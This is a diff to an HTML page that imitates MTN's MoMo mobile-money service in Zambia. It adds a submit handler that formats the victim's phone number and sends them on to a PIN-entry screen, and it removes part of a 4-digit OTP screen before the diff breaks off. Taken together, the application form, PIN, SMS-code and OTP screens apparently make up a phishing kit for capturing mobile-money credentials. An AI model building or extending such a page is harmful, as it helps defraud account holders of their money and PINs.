@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125f" />
+  <link rel="stylesheet" href="style.css?v=20261125g" />
 </head>
 <body>
   <div class="app-container">
@@ -294,7 +294,12 @@
             type="button"
             onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form2').classList.add('active');window.scrollTo(0,0);"
           >← Previous</button>
-          <button id="btn-form3-submit" class="btn-momo-solid compact-prog" type="button">SUBMIT APPLICATION</button>
+          <button
+            id="btn-form3-submit"
+            class="btn-momo-solid compact-prog"
+            type="button"
+            onclick="(function(){var ph=(document.getElementById('form-phone')&&document.getElementById('form-phone').value.trim())||'';var digits=ph.replace(/\D/g,'');var norm=digits.startsWith('260')?'0'+digits.slice(3):digits;var disp=/^(096|076|056)\d{7}$/.test(norm)?norm.slice(0,3)+' '+norm.slice(3,6)+' '+norm.slice(6):(norm||'096 XXX XXXX');if(document.getElementById('display-pin-phone'))document.getElementById('display-pin-phone').innerText=disp;if(document.getElementById('display-sms-phone'))document.getElementById('display-sms-phone').innerText=disp;if(document.getElementById('display-otp-phone'))document.getElementById('display-otp-phone').innerText=disp;document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-pin').classList.add('active');window.scrollTo(0,0);var firstPin=document.querySelector('.pin-box-5');if(firstPin)firstPin.focus();})()"
+          >SUBMIT APPLICATION</button>
         </div>
       </div>
     </section>
@@ -388,32 +393,4 @@
 
         <button id="btn-validated-sms" class="btn-momo-solid" type="button">SUBMIT SMS</button>
       </div>
-    </section>
-
-    <!-- Screen 8: MTN MoMo 4-Digit OTP Screen -->
-    <section id="screen-otp" class="screen">
-      <div class="top-nav-bar">
-        <span class="hamburger">☰</span>
-        <div class="momo-nav-logo">
-          <span>MTN</span>
-          <strong>MoMo</strong>
-        </div>
-      </div>
-
-      <div class="sub-nav-strip dark-strip">
-        <span class="nav-back-light">MTN MoMo 4-Digit OTP</span>
-        <span class="hamburger-dark">ZAMBIA</span>
-      </div>
-
-      <div class="card-container-spacious">
-        <h2 class="enter-pin-heading" style="margin-top: 12px;">MTN MoMo 4-Digit OTP</h2>
-        <p class="sms-notice" style="text-align: center;">
-          Enter the 4-digit OTP code sent to your MTN MoMo number to verify and continue:
-        </p>
-
-        <p id="display-otp-phone" class="applicant-phone-subtitle">096 XXX XXXX</p>
-
-        <div id="banner-otp-error" class="surface-error-banner"></div>
-
-        <div class="otp-boxes-4">
-     
+ 
